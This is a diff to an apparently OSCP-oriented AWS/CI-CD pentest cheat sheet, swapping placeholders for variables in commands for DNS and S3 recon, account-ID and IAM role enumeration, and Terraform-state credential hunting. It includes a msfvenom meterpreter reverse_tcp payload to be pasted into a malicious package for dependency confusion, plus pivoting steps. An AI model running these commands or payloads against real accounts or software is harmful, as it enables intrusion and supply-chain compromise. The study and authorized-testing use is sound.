@@ -29,22 +29,22 @@ aws sts get-caller-identity --profile <name>   # verify who you are
 
 ```bash
 # 1. Identify the DNS provider (awsdns = AWS Route53)
-host -t ns <domain>
+host -t ns $Domain
 whois <ns-hostname> | grep "Registrant Organization"   # → Amazon Technologies = confirmed Route53
 
 # 2. Resolve main hostnames → EC2 PTR prefix confirms EC2 hosting
-host www.<domain>
-host <ip>   # → ec2-X-X-X-X.compute-1.amazonaws.com
+host www.$Domain
+host $BoxIP   # → ec2-X-X-X-X.compute-1.amazonaws.com
 
 # 3. Reverse whois on the IP
-whois <ip> | grep "OrgName"   # → Amazon Technologies Inc.
+whois $BoxIP | grep "OrgName"   # → Amazon Technologies Inc.
 
 # 4. TXT records — flags/data sometimes hidden inside SPF/verification strings
-dig TXT <domain> @<lab_dns_ip>
+dig TXT $Domain @<lab_dns_ip>
 # Look for non-standard strings concatenated into otherwise-legit-looking records
 
 # 5. Subdomain brute force
-dnsenum <domain> --threads 100
+dnsenum $Domain --threads 100
 # Zone transfers will fail on Route53 (AXFR record query failed: corrupt packet) — expected
 ```
 
@@ -52,7 +52,7 @@ dnsenum <domain> --threads 100
 
 ```bash
 # Find bucket names from site assets
-curl -s http://<site_ip> -H "Host: www.<domain>" | grep -o '<org>-[^/"]*'
+curl -s http://$BoxIP -H "Host: www.$Domain" | grep -o '<org>-[^/"]*'
 # Or browse in Firefox: DevTools → Network tab → filter by s3.amazonaws.com requests
 
 # Test bucket ACL by removing the object key from the URL
@@ -81,7 +81,7 @@ cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
 ```bash
 # Filter by name/description keyword (much faster than --owners amazon)
 aws ec2 describe-images --executable-users all \
-  --filters "Name=name,Values=*<target-keyword>*" --profile attacker
+  --filters "Name=name,Values=*$BoxName*" --profile attacker
 
 # OwnerId in the result = target's 12-digit AWS Account ID
 ```
@@ -102,7 +102,7 @@ aws iam put-user-policy --user-name enum --policy-name s3-read \
   --policy-document file://policy-s3-read.json --profile attacker
 
 # Test: Success = first digit is 0, AccessDenied = not 0
-aws s3 ls <target-public-bucket> --profile enum
+aws s3 ls $BoxName --profile enum
 
 # Change "0*" → "1*" → "10*" → etc. until all 12 digits confirmed
 ```
@@ -134,7 +134,7 @@ done > /tmp/roles.txt
 # In Pacu
 pacu
 # → create session, import_keys <profile>
-run iam__enum_roles --account-id <target-account-id> --word-list /tmp/roles.txt
+run iam__enum_roles --account-id $BoxName --word-list /tmp/roles.txt
 # Pacu: MalformedPolicy = role doesn't exist, Success = exists, Credentials dumped = assumable
 ```
 
@@ -155,7 +155,7 @@ aws sts get-caller-identity --profile <compromised>
 aws sts get-access-key-info --access-key-id AKIA... --profile attacker
 
 # Stealthy: Lambda invoke error leaks identity via error message, logged as data event (not event history)
-aws lambda invoke --function-name arn:aws:lambda:us-east-1:<acct>:function:nonexistent outfile \
+aws lambda invoke --function-name arn:aws:lambda:us-east-1:$Username:function:nonexistent outfile \
   --profile <compromised>
 ```
 
@@ -163,11 +163,11 @@ aws lambda invoke --function-name arn:aws:lambda:us-east-1:<acct>:function:nonex
 
 ```bash
 # Check inline + managed policies on the user
-aws iam list-user-policies --user-name <user> --profile <compromised>          # inline
-aws iam list-attached-user-policies --user-name <user> --profile <compromised>  # managed
+aws iam list-user-policies --user-name $Username --profile <compromised>          # inline
+aws iam list-attached-user-policies --user-name $Username --profile <compromised>  # managed
 
 # Check group memberships → inherited policies
-aws iam list-groups-for-user --user-name <user> --profile <compromised>
+aws iam list-groups-for-user --user-name $Username --profile <compromised>
 
 # Read each policy document
 aws iam list-policy-versions --policy-arn <arn> --profile <compromised>
@@ -267,7 +267,7 @@ Attack flow: OSINT reveals internal package name + version → publish higher ve
 ```bash
 # Generate meterpreter python payload
 msfvenom -f raw -p python/meterpreter/reverse_tcp \
-  LHOST=<your-ip> LPORT=4488
+  LHOST=$LocalIP LPORT=4488
 
 # Paste exec() line at bottom of utils.py, then build:
 cd ~/hackshort-util && python3 setup.py sdist
@@ -299,7 +299,7 @@ run -j
 route add 172.30.0.0 255.255.0.0 <session_id>
 
 # From personal Kali
-ssh -fN -L localhost:1080:localhost:1080 kali@<cloud-kali-ip>
+ssh -fN -L localhost:1080:localhost:1080 kali@$LocalIP
 ```
 
 ### 5.4 Jenkins Secrets Enumeration
@@ -330,7 +330,7 @@ aws --profile=<stolen> s3 ls s3://tf-state-<suffix>/
 
 # Download and inspect
 aws --profile=<stolen> s3 cp s3://tf-state-<suffix>/terraform.tfstate ./
-grep -A20 '"index_key": "<username>"' terraform.tfstate
+grep -A20 '"index_key": "$Username"' terraform.tfstate
 
 # Find users with admin policies
 grep -B2 -A2 "AdministratorAccess" terraform.tfstate
@@ -342,3 +342,18 @@ grep -B2 -A2 "AdministratorAccess" terraform.tfstate
 - [HackTricks. AWS CI/CD (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cloud/aws-security/)
 - [PayloadsAllTheThings. Cloud AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
 - [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+## External Resources
+
+- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
+- https://www.revshells.com/
